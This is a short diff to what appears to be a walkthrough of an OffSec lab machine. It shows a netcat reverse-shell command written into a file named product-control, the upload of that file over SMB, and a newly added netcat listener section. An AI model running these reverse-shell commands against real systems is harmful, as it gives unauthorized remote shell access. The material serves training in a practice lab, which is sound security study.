@@ -235,8 +235,15 @@ Reverse Shell
 ```
 echo "nc -e /bin/sh 192.168.45.245 1337" > product-control
 ```
+
 Upload Reverse Shell
 ```
 smb: \> put product-control 
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/c26c9700-4d05-4fa1-9ac3-0e7807c53f85)
+
+Netcat Listener
+```
+> rlwrap nc -nlvvp 1337
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/05df774d-2d5c-478e-80b4-4a079c0e9191)
